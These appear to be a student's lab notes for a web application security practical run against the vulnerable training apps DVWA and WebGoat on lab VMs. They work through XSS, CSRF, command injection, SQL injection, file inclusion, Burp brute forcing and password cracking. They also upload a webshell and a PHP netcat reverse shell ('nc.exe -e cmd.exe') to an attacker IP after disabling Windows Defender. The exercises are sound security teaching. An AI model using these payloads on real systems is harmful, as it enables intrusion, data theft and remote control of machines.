# EHD Practical 6 - Web Application Security

###### tags: `EHD`

## Table of Contents
```toc
```

## Reflected Cross-Site Scripting
**Using any VM or Host PC**
1. Browse to DVWA and click on **XSS (reflected)**
2. Type any string into textbox and submit
	-  What is typed will be displayed
3. Type into textbox to call an alert popup with the output:
```html
<script>alert("hello");</script>
```

4. Click <button>View Source</button> button on <u>lower right corner</u> or webpage
	- Popup will appear with source code of webpage
	- Whatever user enters is stored into the variable 'name' and displayed in echo command
5. In left menu, click **DVWA Security** and set security level to **Impossible**
6. Enter into the textbox again and click <button>Submit</button>
	- This time, script will not run and no popup will appear
7. Click on <button>View Source</button> button again. User input is sanitized by passing through a special function called `htmlspecialchars`
8. In left menu, click **DVWA Security** and set security level back to low

## Stored Cross-Site Scripting
> **Stored Cross-Site Scripting** occurs when user input stored by web server and displayed on webpages to others

**Using any VM or Host PC**
1. Browse to DVWA and click on **XSS (Stored)**
2. Look at bottom left corner of webpage and check that security level is <u>low</u>
3. Type name in <u>Name</u> textbox
4. Type following for message and click <button>Sign Guestbook</button>
```html
<script>alert("haha");</script>
```

5. Every time anyone clicks on XSS (Stored) to see Guestbook, popup will appear

<u>Redirecting users to another website:</u>
1. Type the following to redirect users to another website (google.com)
```html
<script>document.location="https://www.google.com"</script>
```

> #### Pointers:
> - If there is a maximum length restriction for Message `textarea`, press <kbd>F12</kbd> to bring up Developer Tools
> - Under **DOM Explorer** or **Elements or Inspector**, expand items until you see Message `textarea` element
> - Double click on `maxlength` and change the length accordingly
> 
> ![](https://i.imgur.com/e4sSKVf.png)

2. Click <button>Sign Guestbook</button>
3. Click on XSS (Stored) to see Guestbook -> redirected to Google
	- Hacker can possibly redirect anyone from Guestbook to their own malicious website!

<u>Creating a fake login form:</u>
1. Click on XSS (Stored)
2. Type name in Name textbox
3. Type the following for message and click <button>Sign Guestbook</button>
```html
Login to see more features: <br>
<form>
Username: <input type="text"><br>
Password: <input type="password"><br>
<input type="submit" value="login">
</form>
```

4. Fake login form created and visitors who are not careful may fill in their username and password for the hacker

Resetting the Database -> click on <button>Setup</button> and click <button>Create/Reset Database</button>

## Cross-Site Request Forgery (CSRF)
> **Cross-Site Request Forgery (CSRF)** happens when user is currently logged in to a trusted site and attacker causes his browser to send unwanted request to the trusted site

**Using any VM or Host PC**
1. Browse to DVWA and click on **CSRF**
2. Check that Security Level is set to **Low**
3. Right-click anywhere in the form and select **View Source**
4. Scroll down until the form for entering new password is found
	- Note the form method is "GET"
	- Means that user input will be passed through query string in URI
5. Enter "password" for New and Confirm password and click **Change**
	- Take note of how new password values are passed in URI textbox
6. Create new file called <u>csrf.html</u> with the following contents: 
```html
<!--
Comments:
- Replace Win10-IP with own Win10 VM IP Address
- Image source set to URI dusplayed when admin password is changed
-->
This is a very new web page
<img width="1" src="http://Win10-IP/dvwa-master/vulnerabilities/csrf/?password_new=12345678&password_conf=12345678&Change=Change">
```

7. Save <u>csrf.html</u> file
8. While logged into the DVWA website, right-click on <u>csrf.html</u> file and open with the same web browser
	- Web browser will automatically load the link associated with image and cause DVWA admin password to be change
9. Log out of DVWA website and log back in
	- Password has been changed to "12345678"
10. Click on CSRF and change password back to "password"
11. Click on CSRF and **View Source**
12. At bottom of View Source page, click **Compare All Levels** -> source code for different security levels shown
	- When security level is **High**, web application checks for session token before password change is allowed
	- When security level is **Impossible**, other than checking for session token, user is asked to enter current password before allowing password change

<u>CSRF Example 2</u>
1. Browse to www.imdb.com and browse through some movies
2. Scroll down until the **Recently Viewed** section.
3. Create new file called <u>imdb.html</u> with the following contents:
```html
<iframe width="1" height="1" src="https://www.imdb.com/title/tt0803096"></iframe><br>
Good Day!
```

4. Save the <u>imdb.html</u> file
5. While inside the IMDB website, right click on <u>imdb.html</u> and open in the same browser
6. Web browser will automatically load the page from IMDB
	- The `iframe` is only pixel, so difficult to find
7. Click **Refresh**, a new movie appears in the recently visited list

## Command Injection
> This webpage allows user to ping another system, but also can be used to execute other commands

**Using any VM or Host PC**
1. Browse to DVWA and click on **Command Injection**
2. Check that security level is set to **Low**
3. Type IP of Host PC or other VMs
4. Type an IP followed by `&& dir c:\` and click **Submit**
5. Directory listing of C drive of the Win10 VM is revealed
	- Hacker can possibly run commands from client side and read, delete files, add users on web server

## SQL Injection
**Using any VM or Host PC**
1. Browse to DVWA and click on **SQL Injection**
2. For user ID, type "1", "2", "3", etc. to see user details displayed
3. Type the following for user ID:
```SQL
ppp' or '0' = '0
```

4. SQL statement will retrieve all users from table so list of users will be displayed
5. Type the following for the user ID (retrieving more columns)
```SQL
-- Note: Remember to put a space after the '--'!
-- '--' means to treat the rest of the line as a comment
ppp' or '0' = '0' union select user_id, user from users -- 

``` 

6. Type the following for the user ID (retrieving passwords from the table)
```SQL
ppp' or '0' = '0' union select user_id, password from users -- 
```

In MySQL, there is a special database called `information_schema` that contains a table called "tables" that stores all the information about the tables.

<u>Use SQL injection to list out all table names in all databases:</u>
```SQL
ppp' or '0' = '0' union select table_schema, table_name from information_schema.tables -- 
```

### John The Ripper
**On Kali VM**
1. Use John The Ripper to crack the hashed passwords inside <u>passwd.txt</u>
```
sudo john passwd.txt
```

2. Run John The Ripper with various suggested formats:
```
sudo john --format=raw-md5 passwd.txt
```

## Forced Browsing
**Using any VM or Host PC** browsing DVWA
1. Click on **File Inclusion** and set security level to <u>Low</u>
2. Click on `file1.php`
```
http://Win10-IP/dvwa-master/vulnerabilities/fi/?page=file1.php
```
3. Click back
4. Click on `file2.php`
```
http://Win10-IP/dvwa-master/vulnerabilities/fi/?page=file2.php
``` 
5. Click back
6. Click on `file3.php`
```
http://Win10-IP/dvwa-master/vulnerabilities/fi/?page=file3.php
``` 
7. Change URL to find hidden `file4.php` file
```
http://Win10-IP/dvwa-master/vulnerabilities/fi/?page=file4.php
``` 

## File Inclusion
>- In File or Path Inclusion vulnerabilities, path to web resources on web server are displayed
>- Gives potential attackers information about how web pages and resources stored on the web server

**Using any VM or Host PC** browsing DVWA
1. Click on **File Inclusion** and set security level to <u>Low</u>
2. Change URL to following to require for non-existent page:
```
http://Win10-IP/dvwa-master/vulnerabilities/fi/?page=include2.php
```
3. Error message displayed contains information about full path of page: `c:\xampp\htdocs\DVWA-master`
4. Change URL to find configuration file of Apache Web Server
```
http://Win-10/dvwa-master/vulnerabilities/fi/?page=..\..\..\..\apache\conf\httpd.conf
```
5. Experienced attacker might save config file and view the file using a text viewer to find important information
6. Change DVWA security level to <u>High</u> and repeat request for non-existent page
7. This time, error message does not disclose information about webroot


## Burp Suite to Brute Force Passwords
- **Intercepting Proxies** can be used to crawl websites and intercept and modify HTTP requests/responses

### Configuring Firefox Browser to use Burp Suite as the Proxy
**On Kali VM**
1. Start web browser and browse to DVWA on Win10 VM
```
http://192.168.10.100/dvwa-master
```

> <u>Troubleshooting</u>
> - If unable to connect to DVWA on Win10 VM, check if Windows Firewall blocking access
> - Add Exception for Port 80 if required

2. Login DVWA (username: `admin` and password: `password`)
3. Set security level to <u>Low</u>
4. Go to Burp Suite (`sudo burpsuite` in a terminal also works)
5. If there is message about Java JRE, click <button>OK</button>
6. Choose default Temporary Project and click <button>Next</button>
7. Use Burp default values and start Burp

![](https://i.imgur.com/bn19YlK.png)

8. Click on **Proxy** tab
	- If one of the buttons have the words "Intercept is on", turn Intercept off.
9. Open **Preferences** in Firefox 
10. In Manuel proxy configuration, enter the following:

![](https://i.imgur.com/N1Xnd9N.png)

11. Now all HTTP requests will pass through Burp Suite.
12. In web browser, click some of the menu items in DVWA
	- Structure of DVWA capture and HTTP request and responses

![500](https://i.imgur.com/H8n22PE.png)

### Brute Forcing a Password in DVWA with Dictionary Lists
13. On Kali VM, open terminal and create new file called `my_user_list` with two usernames:
```
admin
user
```
14. Create another file called `my_password_list` with 3 passwords:
```
12345678
password
mypass
```

15. In web browser, browse to DVWA Brute Force
16. In Burp Suite, click Proxy tab and set **Intercept is on**
17. Type `admin` on the web browser for username and `12345678` on password. Click <button>Login</button>
18. HTTP sent is intercept by Burp -> look for HTTP request that contains Brute Force submitted form with username `admin` and password `12345678`
19. If other HTTP requests seen not containing username `admin` or password `12345678`, forward them to its destination

![](https://i.imgur.com/yBN5Vt8.png)

20. If HTTP packet contains Brute Force submitted form, click on <u>Action</u> and choose <u>send to intruder</u>

![](https://i.imgur.com/06HI1qM.png)

21. Under Intruder tab, click on **Positions** tab. HTTP request will be sent with parameters highlighted
22. In right hand side, click <u>Clear</u> to clear highlighted parameters
23. Select username value `admin` and click <button>Add</button>
24. Select password value `12345678` and click <button>Add</button>
25. Two payloads: username and password 
26. Change attack type to <u>cluster bomb</u>
27. Click on **Payloads** tab. 
28. Check that payload set 1 selected (for username)
29. Under payload options, click on load and browse to `my_user_list` file
30. Click <button>Open</button> and 2 usernames will be loaded

	![350](https://i.imgur.com/f9CWL7c.png)

31. Change payload set to 2 (for password)
32. Click on load and browse to `my_password_list`
33. Click <button>Open</button> and three passwords will be loaded

	![](https://i.imgur.com/o7JxkFp.png)

34. Click on **Options** tab and scroll down and ensure that <u>Store requests</u> and <u>Store responses</u> checked

	![](https://i.imgur.com/MT5gSDM.png)

35. In Intruder menu, scroll up and in top right hand corner, click <u>Start Attack</u>

	![](https://i.imgur.com/3KTPziU.png)

36. Burp will try all combinations of 2 usernames and 3 passwords
37. When results displayed, select one of the wrong username/password combinations and click on **response** tab
38. Scroll down to HTTP response and error "Username and/or password incorrect" returned

![500](https://i.imgur.com/KwaXvOl.png)

39. Select correct admin/password and click on response tab
40. Message displayed is "Welcome to password protected area admin"
	- When correct username and password found, response page contains different text
	- By viewing lengths of response pages, one that is different from other packets can be the one containing correct username and password
	- If the contents of web page for successful login is known, Burp Suite can be configured to look out for certain strings in web responses per username and password combination

![500](https://i.imgur.com/ptAOlA8.png)

41. Under **Options** tab, scroll down to **Grep -Match** section
42. Click <button>Clear</button> to clear the list
43. In <u>Add</u> textbox, type string "welcome" and click <button>Add</button>

![](https://i.imgur.com/Q7AHQb8.png)

44. When Intruder attack starts, Burp Suite will look for web responses containing the string "welcome" (or whatever text put in the grep -match textbox)
45. Click <u>Start Attack</u>
46. Burp Suite will flag out username/password combination that resulted in web response containing the string "welcome"

![](https://i.imgur.com/b3NvWjc.png)

47. Once done, revert all settings back to **No proxy** so data no longer passes through Burp Suite

> **Higher Security Levels**
> - **High Security Level** -> when Login failed, `sleep(rand(0, 3))` statement
> - **Impossible Security Level** -> if password entered wrongly 3 times, account locked for 15 minutes to deter brute force password attacks 

## File Upload to Upload Malicious Files
**On Kali VM**
1. Start Web Browser and browse to DVWA on Win10 VM
2. Click on **File Upload** and set security level to <u>Low</u>

> - File upload feature meant for users to upload images
> - But when security level is low, web application does not check file type being uploaded

### Uploading HTML File to the Web Server
1. Using a text editor, create file `abc.html` and enter some text in it:
```
this is abc
```
2. In DVWA, click on <u>Browse</u> and select file `abc.html`
3. Click <button>Upload</button>: File will be uploaded to web server and path will be displayed
![](https://i.imgur.com/poKARAw.png)

4. In web browser, browse to uploaded file:
```
http://Win10-IP/dvwa-master/hackable/uploads/abc.html
```

5. Without checking, users can create HTML pages with malicious content and upload them to the web server

### Creating a script for a backdoor to run commands on the web server
1. In a terminal, list contents of `/usr/share/webshells/`
```
ls /usr/share/webshells/
```

2. Determine which programming languages supported by DVWA web application (`nmap -sV` version scan):
```
sudo nmap -sV -p 80 <Win10-IP>
```

![](https://i.imgur.com/bdavvg8.png)

3. List out contents of `php` directory
```
ls /usr/share/webshells/php
```

4. Make a `simple-backdoor.php` script (Make copy of it to `/tmp` directory)
```
cp /usr/share/webshells/php/simple-backdoor.php /tmp
```

5. Upload `simple-backdoor.php` script to DVWA

![](https://i.imgur.com/kxDH0PZ.png)

**On Win10 VM**
1. In Win10 target, look in contents of `C:\xampp\hackable\uploads` folder - `simple-backdoor.php` script has been uploaded

**On Kali VM**
1. Browse to uploaded script and run it
2. Error returned and script is not able to run

![](https://i.imgur.com/RxobCqS.png)

**On Win10 VM**
1. Check contents of `C:\xampp\htdocs\hackable\uploads` folder - `simple-backdoor.php` is removed
	- This is because Windows Defender running on the Win10 VM and detected attempt to run malicious script
2. Disable Real-time Protection of Windows Defender

**On Kali VM**
1. In DVWA File Upload, browse to `simple-backdoor.php` script and upload it again
2. Browse to uploaded script to run it and this time the script can be run
3. Change URL to run commands on Win10 (use + sign if there are spaces in command)

![](https://i.imgur.com/HJivVJH.png)
```
http://Win10-IP/dvwa-master/hackable/uploads/simple-backdoor.php?cmd=dir+C:\\Windows
```
![](https://i.imgur.com/yhGl9Kn.png)
- This vulnerability exists because web application allows any type of file
- For **Impossible Security Level**, web application allows only JPEG or PNG file formats

## File Upload to Upload Reverse Shell
**On Win10 VM**
1. For uploaded scripts to run on Win10 target, ensure that Real-time Protection feature of Windows Defender is off

**On Kali VM**
1. List out contents of `/usr/share/webshells/php`

![](https://i.imgur.com/SfjaUph.png)

2. View `php-reverse-shell.php` - Use this script by changing `$ip` and `$port` variables to IP and port with process like Netcat listening

![400](https://i.imgur.com/h6Z4agy.png)

3. If script runs on target, script will connect back to the attacker's computer on specified port and run the commands in `$shell`
	- Giving the hacker `/bin/sh` interactive shell

> **Take Note:**
> - `php-reverse-shell.php` only works on Linux targets
> - DVWA running on Windows needs a reverse shell suitable for Windows targets
> - Windows User Account Control (UAC) security feature may prevent such scripts from running on the target

### Upload a Script to run Netcat software
**On Kali VM**
1. Download Netcat for Windows
2. Run the executable file `nc.exe`
3. Create the following script `nc-reverse-shell.php`
```php
<?php
	header("Content-type: text/plain");
	$ip = "Kali-IP";  // Change to Kali IP
	$port = "443";    // Change to any port number not in use
	$cmd = "nc.exe -e cmd.exe ".$ip." ".$port;
	echo "\nExecuting : ".$cmd."\n";
	$output = system($cmd)
?>	
```

4. On a terminal, run Netcat (Kali version) to start listening to a port:
```
sudo nc -l -p <port-number>
```

5. Browse to DVWA and set security level to low
6. Click on **File Upload**
7. Upload both `nc.exe` and `nc-reverse-shell.php` files
8. Browse to path of uploaded `nc-reverse-shell.php` file
```
http://Win10-IP/dvwa-master/hackable/uploads/nc-reverse-shell.php
```

9. Switch to terminal where Netcat is running
10. If reverse shell is successful, can run commands on target using the Command Prompt from Win10 VM

## WebGoat
> **WebGoat** is another vulnerable web application that can be used for testing

**On Kali VM**
1. Download `webgoat-server-nnnn.jar` file
2. Default port for WebGoat is port 8080 -> Run the following command to strat WebGoat on Port 9000 (or any other port numbers other than 8080 as it will be used for Burp Suite)
```
java -jar webgoat-server-nnnn.jar --server.port=9090
```

3. Using Firefox web browser, browse to `http://127.0.0.1:9090/WebGoat`
4. Register a new user and create a new user account
	- Username: `webgoat`
	- Password: `webgoat`

## WebGoat (Client Side) - Bypass Front End Restrictions
- Web application sometimes implements client-side checks on user input

**On Kali VM**
1. On WebGoat, expand "Client side" and select "Bypass front-end restrictions"
2. Go to Page 2

> - In most browsers, client has complete or almost complete control over HTML part of webpage
> - They can alter values or restrictions to suit their preference

![](https://i.imgur.com/S9Ghbm7.png)

3. On Kali menu, open Burp Suite
4. Change proxy settings by opening `about:config` in the Firefox browser
5. In the search box, search for `network.proxy.allow_hijacking_localhost`

![](https://i.imgur.com/v9eKCnt.png)

6. Double click on `network.proxy.allow_hijacking_localhost` to change value to true

![](https://i.imgur.com/H4UQAhV.png)

7. Set the HTTP proxy by change the manual proxy configuration in the browser preferences
8. Ensure that **Intercept is on** on Burp Suite
9. In Burp, many HTTP request packets like below are trapped and will appear - there are not the packet containing the submitted form
10. Click forward to forward them
11. Keep clicking forward until HTTP request packet containing the submitted form is found

![500](https://i.imgur.com/8h2pCRH.png)

12. Change values for various input fields
13. Set **Intercept is off** on Burp Suite - modified HTTP request is sent to WebGoat
14. Go to Page 3
15. Form has front end validation checks to ensure data entered is valid
16. User is supposed to only enter three lowercase characters in Field 1
	- Otherwise, error will be displayed
17. Ensure that **Intercept is on** in Burp Suite
18. Change Field 1 to three lowercase characters
19. Forward packets until HTTP request packet for submitted form found
20. Modify form data so that all fields do not meet validation checks

![](https://i.imgur.com/vXNDutX.png)

21. Set **Intercept is off** in Burp
22. Modified HTTP request sent to WebGoat

## WebGoat (Authentication Flaws) - Authentication Bypass
> - Authentication bypasses happen in many ways, but usually take advantage of some flow in the configuration or logic
> - Tampering to achieve the right conditions

**On Kali VM**
1. On WebGoat, expand (A2) Broken Authentication or Authentication Flaws and select Authentication Bypasses
2. Go to Page 2
3. Configure Firefox browser proxy to use Burp on 127.0.0.1 Port 8080
4. Set **Intercept is on** on Burp Suite
5. On Firefox browser, type some answers to security questions and click <button>Submit</button>
6. In Burp, forward HTTP request packets until HTTP request to POST answers to security questions

![550](https://i.imgur.com/jMtIc1F.png)

7. In Burp, change body of HTTP request so `secQuestion0` and `secQuestion1` will always be true
8. Set **Intercept is off** in Burp. Modified HTTP request sent to WebGoat
9. Check if answer is correct in Firefox browser

![](https://i.imgur.com/3HNxQSP.png)

## WebGoat (Access Control Flaws) - Insecure Direct Object Reference
> - Direct Object References are when application uses client-provided input to access data and objects
> - They are insecure when reference not properly handled and allows for authorization bypasses or disclose private data that can be used to perform operations or access data that user should be performing or accessing
> - URL can be manipulated into browsing to another page

1. On WebGoat, expand (A5) Broken Access Control or Access Control Flaws and select Insecure Direct Object References
2. Click on Button 2 to proceed
3. Login with username `tom` and password `cat` and click <button>Submit</button>
4. Click Button 3 to proceed
5. Click on **View Profile**
	- Logged in as "Tom Cat"
	- Profile also contains color "yellow" and size "small"

However page also states that HTTP response packet sent by WebGoat contains other attributes for Tom Cat's profile not displayed on the page

6. Start Burp Suite 
7. Configure proxy to use Burp on 127.0.0.1 Port 8080
8. Set **Intercept is on** in Burp
9. On Firefox Browser, click on View Profile to send HTTP request again
10. Forward the HTTP packets until the HTTP request for View Profile is found

![](https://i.imgur.com/y5m2mKF.png)

11. Click on <button>Action</button> and select **Send to Repeater**
![](https://i.imgur.com/fJeXrey.png)

12. Select **Repeater** tab - HTTP request appears under Request column
13. Click <button>Send</button>  to send HTTP request to WebGoat
14. HTTP Response appears in the Response column

![](https://i.imgur.com/FZgCSoA.png)

15. Other attributes like `userId` and `role` found in the HTTP response packet but not displayed on the webpage
16. Set **Intercept is off** in Burp
17. If submitted answer is correct, click Button 4 to proceed
18. Prompt to guess alternate URL to view Tom Cat's profile

> GET request is `GET /WebGoat/IDOR/profile`

19. Tom Cat has the `userId: 2342384`, enter `/WebGoat/IDOR/profile/2342384` in the textbox in the browser
20. If submitted answer is correct, click on Button 5 to proceed
21. Prompt to click **View Profile** button, intercept HTTP request and modify it to view another user's profile
22. Set **Intercept is on** in Burp
23. On Firefox browser, under **View Another Profile** click the **View Profile** button
24. Click **Forward** until HTTP request for **View Profile** is found

![](https://i.imgur.com/Vyr9qdC.png)

25. In Burp, replace `%7Buserid%7D` with possible `userid` value

![](https://i.imgur.com/NtM3nqa.png)

26. Set **Intercept is off** in Burp
27. In Firefox browser, check if answer is correct
	- If no message appears, answer is wrong and user does not exist
	- Try another `userid`
28. Set **Intercept is on** in Burp and replace another `userid` and set **Intercept is off** to check the answer. Repeat this until answer is correct

<u>Editing another profile:</u>
1. Edit Buffalo profile by changing the role and color
2. Set **Intercept is on** 
3. On Firefox browser, in the Button 5 page, under **Edit Another Profile**, click the View Profile Button
4. Click forward until HTTP request for **View Profile** can be found
5. Make the following changes to the HTTP request:

![](https://i.imgur.com/2HEsK7D.png)

6. Set **Intercept is off**
7. In Firefox browser, check if answer is correct
8. If answer is wrong, check for typing errors or refresh the webpage

## WebGoat (Injection Flaws) - SQL Injection
> - **SQL Injection** attack consists of insertion or injection of malicious code via SQP query input from client to application
> - Occurs when unfiltered data from client (e.g. input of search field) gets into SQL interpreter of application itself
> - If input left unchecked, hackers can manipulate underlying SQL statements to their advantage

<u>Practicing with SQL:</u>
1. In WebGoat, expand "SQL Injection Flaw"
2. Select SQL Injection (Introduction)
3. Go to page 2

![](https://i.imgur.com/xgptxOa.png)

4. Enter the following query to retrieve the department of Bob Franco.
```SQL
select department from employees where userid = '96134'
```

5.  Message: "Succeeded"
6. Go to page 3

![](https://i.imgur.com/vM2qfCw.png)

7. Enter following update statement to update department of Tobi Barnett
```SQL
update employees set department = "Sales" where userid = "89762"
```

8. Message: "Succeeded"
9. Go to page 4

![](https://i.imgur.com/ektFsyk.png)

10. Enter following alter statement to add new column to table "employees"
```SQL
alter table employees add phone varchar(20)
```

11.  Message: "Succeeded"
12. Go to page 5

![](https://i.imgur.com/eLT200Q.png)

13. Enter following statement to grant userGroup "UnauthorizedUser" the right to alter tables
```SQL
grant alter table to UnauthorizedUser
```
14.  Message: "Succeeded"

<u>Trying SQL injection:</u>
1. Go to page 9
	- For first drop box, select `'`
	- For the second drop box, select `or`
	- For the third drop box, select `1 = 1`

![](https://i.imgur.com/3t6cJrN.png)

2. Message "Succeeded" should be returned
3. Go to page 10
4. Inject the login count by entering the following values:
	- `Login_Count: 0`
	- `User_Id: 0 or 1=1`
5. Message: "Succeeded"
6. Go to page 11

![600](https://i.imgur.com/MPptDfT.png)

7. Inject Employee Name by entering the following values:
	- Employee Name: `a' or '1' = '1 `
	- Authentication TAN: `3SL99A`
8. Message: "Retrieved one record"
9. Inject both Employee Name and Authentication TAN
	- Employee Name: `a' or '1' = '1 `
	- Authentication TAN: `3SL99A' or '1' = '1`
10. Message: "Succeeded"
11. Go to page 12

![](https://i.imgur.com/mjmsCSL.png)

12. Find salary for John Smith
	- Employee Name: `Smith`
	- Authentication TAN: `3SL99A`
13. John Smith's record is returned:

![](https://i.imgur.com/oIAVzRw.png)

14. SQL inject Authentication TAN and chain another `UPDATE` statement to update John Smith's salary to high figure
	- Employee name: `Smith`
	- Authentication TAN: `3SL99A'; update employees set salary=100000 where userid='37648`
15. Message: "Well done"
16. Go to page 13

![](https://i.imgur.com/kAdMDv6.png)

17. Enter "update" as Action and click **Search Log**
18. Update statement ran to update John Smith's salary is displayed

![](https://i.imgur.com/nMERfAx.png)

19. Use SQL injection to delete all record from `access_log` table
	- Action contains: `update'; delete from access_log --`
20. Drop the `access_log` table
	- Action contains: `update'; drop table access_log --`
21. Message: "Success"

## WebGoat (Injection Flaws) - SQL Injection (Advanced)
### SQL Injection with UNION
> **Note while working with UNION**
> - Number of columns selected in each statement must be the same
> - Datatype of first column in first SELECT statement must match datatype of first column in the second SELECT statement

1. Select SQL injection (advanced) in WebGoat
2. Go to page 3
3. SQL Inject Name field by entering the following:
	- Name: `a' or 1=1 -- `
4. All records from `user_data` table are displayed
5. SQL Inject Name field and append a `UNION SELECT` query to retrieve records from `user_system_data` table
	- Only 4 columns in `user_system_data` and second `SELECT` query needs 7 columns
	- '1', '2', '3' are placeholders to make up for 7 columns
	- Datatype of columns must match as well, last column in second `SELECT` query is a number
	- Name: `a' or 1=1 union select userid, user_name, password, cookie, '1', '2', 3 from user_system_data -- `
6. All records from `user_data` and `user_system_data` tables displayed
7. Look for Dave's password and enter it as answer 

![](https://i.imgur.com/x8iG4wB.png)

8. Message: "Congratulations"

### Blind SQL Injection
> - Type of injection attack that asks database true or false questions and determines answers based on applications response
> - Used when web application configured to show generic error messages

1. Read about Blind SQL Injection on page 4
2. Go to page 5
3. In the form on Register tab, register new user with username "student"
4. Try to register another user with username "student" -> Message: "User student already exists"
5. Likely when registering a new user, there is `SELECT` query to check if username already exists in table

![](https://i.imgur.com/myhIqND.png)

6. <u>SQL Inject username:</u>
	- Inject username: `student' and '1'='1`
	- Both `student and '1'='1'` are true, so `SELECT` query is successful and returns a message that <u>username already exists</u>
	- Inject username again: `student' and '1'='2`
	- `student` is true but `'1' = '2'` is false, so `SELECT` query is not successful and returns message that <u>user is created</u>
7. Use SQL inject and substring function on password for "tom" to find if first character of password is 'a'
	- Assumption: name of column containing password is 'password'
	- Inject username: `tom` and `substring(password, 1, 1)='a'`
	- `tom` is true but because there is a message that user is created - means that `substring(password, 1, 1)='a'` is false
	- Hence, password does not start with 'a'
	- Trial and error with the other alphabets and numbers
	- To find second character of password: `tom' and substring(password, 2, 1)='a`

## SQL Map
**On Kali VM**
1. Browse to DVWA
2. Login with username "admin" and default password "password"
3. Set security level to **Low**
4. See options for SQLmap

```
sqlmap -h
man sqlmap
```

5. Bring up Developer Tools and click on **Network Tab**
6. Enter a number for user ID and click <kbd>Submit</kbd>
7. Look under Network tab for HTTP packet that contains request and select it

![](https://i.imgur.com/hXOjAiP.png)
8. Look for Request URL of selected packet